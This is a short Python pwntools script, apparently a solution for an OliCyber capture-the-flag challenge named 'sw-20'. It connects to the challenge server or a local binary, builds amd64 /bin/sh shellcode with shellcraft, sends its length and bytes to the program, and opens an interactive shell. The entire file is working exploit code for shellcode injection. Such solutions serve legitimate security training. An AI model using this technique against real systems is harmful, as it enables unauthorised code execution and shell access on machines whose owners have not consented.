from pwn import *

def main():

    _bin = ELF("./sw-20")

    if args.REMOTE:
        p = remote("software-20.challs.olicyber.it", 13003)
    else:
        p = process([_bin.path])

    p.recvuntil(b"... Invia un qualsiasi carattere per iniziare ...")
    p.sendline(b"x")
    asm_code = shellcraft.amd64.linux.sh()
    shellcode = asm(asm_code, arch='x86_64')

    line = p.recvuntil(b":").decode().split()
    p.sendline(str(len(shellcode)).encode('utf-8'))

    line = p.recvuntil(b":").decode().split()
    p.send(shellcode)
    
    p.recvuntil(b"[*] Executing shellcode...")
    p.interactive()




if __name__ == "__main__":
    main()